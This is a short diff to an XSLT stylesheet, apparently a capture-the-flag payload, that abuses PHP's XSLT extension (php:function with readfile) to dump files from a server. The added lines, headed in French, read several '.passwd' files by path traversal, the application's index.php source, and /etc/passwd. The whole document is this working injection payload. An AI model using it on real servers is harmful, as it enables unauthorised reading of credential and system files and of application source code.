@@ -1,6 +1,16 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
 <body>
-<xsl:value-of select="php:function('readfile','.passwd')" />
+  <h2>Fichier .passwd :</h2>
+  <p><xsl:value-of select="php:function('readfile', '../.passwd')" /></p>
+
+  <h2>Fichier index.php :</h2>
+  <p><xsl:value-of select="php:function('readfile', 'index.php')" /></p>
+
+  <h2>Fichier passwd :</h2>
+  <p><xsl:value-of select="php:function('readfile', '/etc/passwd')" /></p>
+
+ <h2>Fichier .passwd :</h2>
+  <p><xsl:value-of select="php:function('readfile', '../../.passwd')" /></p>
 </body>
 </html>
